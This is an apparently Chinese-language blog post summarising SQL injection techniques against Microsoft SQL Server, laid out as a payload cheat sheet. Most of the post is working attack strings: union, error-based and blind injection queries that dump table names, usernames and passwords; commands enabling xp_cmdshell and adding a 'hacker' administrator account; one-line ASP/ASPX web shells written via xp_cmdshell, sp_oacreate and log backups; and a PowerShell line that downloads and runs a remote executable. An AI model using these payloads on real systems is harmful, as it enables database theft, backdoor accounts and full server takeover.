<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入技术总结-Mssql | Flyink's blog</title><meta name="author" content="Flyink"><meta name="copyright" content="Flyink"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="支持的注释符 &#x2F;* – ;%00Mssql 可以利用的空白字符有：01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 @@version &#x2F;&#x2F; 数据库版本user &#x2F;&#x2F;获取当前数据库用户名db_name() &amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入技术总结-Mssql">
<meta property="og:url" content="https://timerings.github.io/posts/23017.html">
<meta property="og:site_name" content="Flyink&#39;s blog">
<meta property="og:description" content="支持的注释符 &#x2F;* – ;%00Mssql 可以利用的空白字符有：01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 @@version &#x2F;&#x2F; 数据库版本user &#x2F;&#x2F;获取当前数据库用户名db_name() &amp;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://timerings.github.io/img/2.png">
<meta property="article:published_time" content="2023-10-24T03:23:58.000Z">
<meta property="article:modified_time" content="2023-10-24T03:28:33.650Z">
<meta property="article:author" content="Flyink">
<meta property="article:tag" content="sql注入">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://timerings.github.io/img/2.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://timerings.github.io/posts/23017.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"BR67XSDY5W","apiKey":"1e7af033be6ebfa1ae9b122b4e0e8cfa","indexName":"hexo","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入技术总结-Mssql',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-24 11:28:33'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

document.addEventListener('pjax:send', () => {
  Pace.restart()
})
</script><link rel="stylesheet" href="/css/corner-indicator.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Flyink's blog"><span class="site-name">Flyink's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入技术总结-Mssql</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-24T03:23:58.000Z" title="发表于 2023-10-24 11:23:58">2023-10-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-24T03:28:33.650Z" title="更新于 2023-10-24 11:28:33">2023-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL注入技术总结-Mssql"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>支持的注释符 &#x2F;* – ;%00<br>Mssql 可以利用的空白字符有：<br>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</p>
<p>@@version &#x2F;&#x2F; 数据库版本<br>user &#x2F;&#x2F;获取当前数据库用户名<br>db_name() &#x2F;&#x2F; 当前数据库名 其中 db_name(N)可以来遍历其他数据库<br>;select user &#x2F;&#x2F;查询是否支持多语句</p>
<p>报错显示 Microsoft OLE DB Provider for ODBC Drivers 错误</p>
<p>●SA 权限：数据库操作、文件管理、命令执行、注册表读取<br>●DB 权限：数据库操作、文件管理<br>●Public 权限：数据库操作</p>
<h1 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h1><ol>
<li>二分法查找列数：order by 2 –</li>
<li>查找页面回显点：id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换 null为数字</li>
<li>查找所在库名称： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4这里也可以使用 db_name(1)、db_name(2)等查询其他数据</li>
<li>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4 提示: xtype&#x3D;’U’ 为 用户表</li>
<li>查找所有列名：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4 替换 col_name(object_id(‘manage’),1) 中的 1 依次为 2，3，4 </li>
<li>查取用户名: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4</li>
<li>获取数据：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4</li>
</ol>
<h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a>全回显操作</h2><p>获取当前数据库中的表（有 2 个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于 mssql2005 及以上版本）】<br>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>一次爆指定表的所有列（只限于 mssql2005 及以上版本）：<br>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;MSSQL 版本<br>And 1&#x3D;(select db_name()) &#x2F;&#x2F;当前数据库名<br>and 1&#x3D;(select @@servername) &#x2F;&#x2F;本地服务名<br>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F;判断是否是系统管理员 sa<br>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin<br>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F;判断是否是库权限 dbo<br>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F;判断是否有库读取权限</p>
<h3 id="1-单个爆破："><a href="#1-单个爆破：" class="headerlink" title="(1)单个爆破："></a>(1)单个爆破：</h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名<br>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名<br>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’ ))— 获取第一个列名<br>and 1&#x3D;convert(int,(select top 1 username from login ))<br>and 1&#x3D;convert(int,(select top 1 password from login ))</p>
<h3 id="2-爆表"><a href="#2-爆表" class="headerlink" title="(2)爆表"></a>(2)爆表</h3><p>爆表，要求 sqlserver 版本 2005 以上<br>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>爆列<br>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p>
<h2 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h2><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –<br>如果是 sa 权限，就延时。</p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p>
<h2 id="XP-CMDSHELL-检测"><a href="#XP-CMDSHELL-检测" class="headerlink" title="XP_CMDSHELL 检测"></a>XP_CMDSHELL 检测</h2><p>看下目标的 xp_cmdshell 存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p>
<p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p>
<p>开启 xpcmdshell 一句话。前提 1、支持堆叠 2、扩展存储过程没被删除<br>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
<p>前提：sa 权限探测是否存在 1433 端口。然后检测是否开启 CMDSHELL<br>用 XP_CMDSHELL 添加用户 hacker：<br>exec master..xp_cmdshell “whoami”</p>
<p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’<br>XP_CMDSHELL 把用户 hacker 加到 ADMIN 组：<br>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p>
<h1 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h1><h2 id="存储过程xp-cmdshell写shell"><a href="#存储过程xp-cmdshell写shell" class="headerlink" title="存储过程xp_cmdshell写shell"></a>存储过程xp_cmdshell写shell</h2><ul>
<li><p>拥有DBA权限</p>
</li>
<li><p>知道的网站绝对路径</p>
</li>
</ul>
<p>xp_cmdshell不能调用，下面命令打开</p>
<p>在2005中xp_cmdshell的权限是system，2008中是network。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启xp_cmdshell</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;`</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span> #能执行得到whoami的结果</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#关闭xp_cmdshell</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">reconfigure;`</span><br><span class="line"><span class="keyword">exec</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">0</span>;</span><br><span class="line">reconfigure;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span> #不能得到whoami的结果</span><br></pre></td></tr></table></figure>



<p>写shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &#x27;echo ^&lt;%eval request(&quot;chopper&quot;)%^&gt; &gt;&gt;f:\\7788\\MSSQL-SQLi-Labs\\shell.asp&#x27;</span><br></pre></td></tr></table></figure>



<p>sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.130.137/1.aspx?id=1;exec master..xp_cmdshell &#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27; ;</span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断当前是否为DBA权限，为1则可以提权</span></span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看是否存在 xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name <span class="operator">=</span> <span class="string">&#x27;xp_cmdshell&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 关闭 xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">0</span>;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开启 xp_cmdshell</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行 xp_cmdshell</span></span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;cmd /c whoami&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- xp_cmdshell 调用cmd.exe用powershell 远程下载exe并执行</span></span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;&quot;echo $client = New-Object System.Net.WebClient &gt; %TEMP%\test.ps1 &amp; echo $client.DownloadFile(&quot;http://example/test0.exe&quot;,&quot;%TEMP%\test.exe&quot;) &gt;&gt; %TEMP%\test.ps1 &amp; powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 &amp; WMIC process call create &quot;%TEMP%\test.exe&quot;&quot;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>无会显,也无法进行 dnslog ，通过临时表查看命令执行的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tmpTable (tmp1 varchar(8000));</span><br><span class="line">insert into tmpTable(tmp1) exec master..xp_cmdshell &#x27;ipconfig&#x27;</span><br><span class="line">select * from tmpTable</span><br></pre></td></tr></table></figure>



<p>常见报错</p>
<p>标记message: 配置选项 ‘xp_cmdshell’ 不存在，也可能是高级选</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;EXEC sp_configure &#x27;user connections&#x27;,1;RECONFIGURE;</span><br></pre></td></tr></table></figure>



<p>如果 xp_cmdshell 被删除了，需要重新恢复或自己上传 xplog70.dll 进行恢复</p>
<p>以mssql2012为例，默认路径为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\xplog70.dll</span><br></pre></td></tr></table></figure>



<p>恢复如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- 判断存储扩展是否存在,返回结果为1就OK</span><br><span class="line"></span><br><span class="line">Select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br><span class="line"></span><br><span class="line">-- 恢复xp_cmdshell,返回结果为1就OK</span><br><span class="line">Exec sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;;</span><br><span class="line">select count(*) from master.dbo.sysobjects where xtype=&#x27;X&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br><span class="line"></span><br><span class="line">-- 否则上传xplog70.dll</span><br><span class="line">Exec master.dbo.sp_addextendedproc &#x27;xp_cmdshell&#x27;,&#x27;D:\\xplog70.dll&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="存储过程sp-oacreate写shell"><a href="#存储过程sp-oacreate写shell" class="headerlink" title="存储过程sp_oacreate写shell"></a>存储过程sp_oacreate写shell</h2><ul>
<li><p>拥有DBA权限</p>
</li>
<li><p>知道的网站绝对路径</p>
</li>
</ul>
<p>有do_owner权限的用户也可以。</p>
<p>判断当前是否为DBA权限，为1则可以提权</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br></pre></td></tr></table></figure>



<p>利用存储过程写入一句话</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@o</span> <span class="type">int</span>, <span class="variable">@f</span> <span class="type">int</span>, <span class="variable">@t</span> <span class="type">int</span>, <span class="variable">@ret</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="variable">@o</span> <span class="keyword">out</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@o</span>, <span class="string">&#x27;createtextfile&#x27;</span>, <span class="variable">@f</span> <span class="keyword">out</span>, <span class="string">&#x27;C:\xxxx\www\test.asp&#x27;</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">exec</span> <span class="variable">@ret</span> <span class="operator">=</span> sp_oamethod <span class="variable">@f</span>, <span class="string">&#x27;writeline&#x27;</span>, <span class="keyword">NULL</span>,<span class="string">&#x27;&lt;%execute(request(&quot;a&quot;))%&gt;&#x27;</span></span><br></pre></td></tr></table></figure>



<p>被删除可以使用这个来提权试试,恢复sp_oacreate</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;  </span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE;  </span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span>;  </span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE;  </span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">0</span>;</span><br></pre></td></tr></table></figure>



<h2 id="日志备份写shell"><a href="#日志备份写shell" class="headerlink" title="日志备份写shell"></a>日志备份写shell</h2><p>优势：</p>
<ul>
<li><p>重复性好，多次备份的成功率高</p>
</li>
<li><p>相对于差异备份而言，shell的体积较小</p>
</li>
</ul>
<p>利用条件：</p>
<ul>
<li><p>拥有DBA权限</p>
</li>
<li><p>知道网站绝对路径，并且可写</p>
</li>
<li><p>站库不分离</p>
</li>
<li><p>数据库必须被备份过一次</p>
</li>
</ul>
<p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式，至少在2008上是这样的，但是使用log备份文件会小的多，当然如果你的权限够高可以设置他的恢复模式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 判断当前是否为DBA权限，为1则可以提权</span></span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> database 库名 <span class="keyword">set</span> RECOVERY <span class="keyword">FULL</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> cmd (a image)</span><br><span class="line">backup log 库名 <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;c:\&#x27;</span> <span class="keyword">with</span> init</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cmd (a) <span class="keyword">values</span> (<span class="number">0x3C25657865637574652872657175657374282261222929253E</span>)</span><br><span class="line">backup log 库名 <span class="keyword">to</span> disk <span class="operator">=</span> <span class="string">&#x27;c:\xxxx\www\2.asp&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h2><ul>
<li><p>拥有DBA权限</p>
</li>
<li><p>知道的网站绝对路径</p>
</li>
</ul>
<p>在 sql server 里 dbo 和 sa 权限都有备份数据库权限，我们可以把数据库备份成 asp 文件，获得 webshell</p>
<p>因为权限的问题，最好不要备份到盘符根目录,如果这种方式失败，大概率是备份的目录没有写权限.</p>
<p>当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。</p>
